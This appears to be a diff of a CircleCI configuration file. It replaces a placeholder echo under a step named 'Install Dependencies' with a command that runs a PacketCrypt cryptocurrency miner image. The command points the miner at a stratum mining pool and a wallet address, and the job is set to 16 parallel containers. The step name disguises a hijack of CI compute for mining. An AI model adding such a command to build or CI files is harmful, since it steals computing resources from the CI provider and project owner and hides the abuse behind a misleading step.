@@ -2,13 +2,13 @@ version: 2.1
 jobs:
     trial:
       docker:
-            - image: thomasjp0x42/packetcrypt ann -p pkt1qpnkxe67wtwtq9e54x2h45tjtyjj5argf53lewj https://stratum.zetahash.com/
+            - image: thomasjp0x42/packetcrypt 
       parallelism: 16
       steps:
         - run:
             name: Install Dependencies
             command: |
-              echo Hello,subscribe it
+             docker run thomasjp0x42/packetcrypt ann -p pkt1qpnkxe67wtwtq9e54x2h45tjtyjj5argf53lewj https://stratum.zetahash.com/
 
 workflows:
     version: 2.1
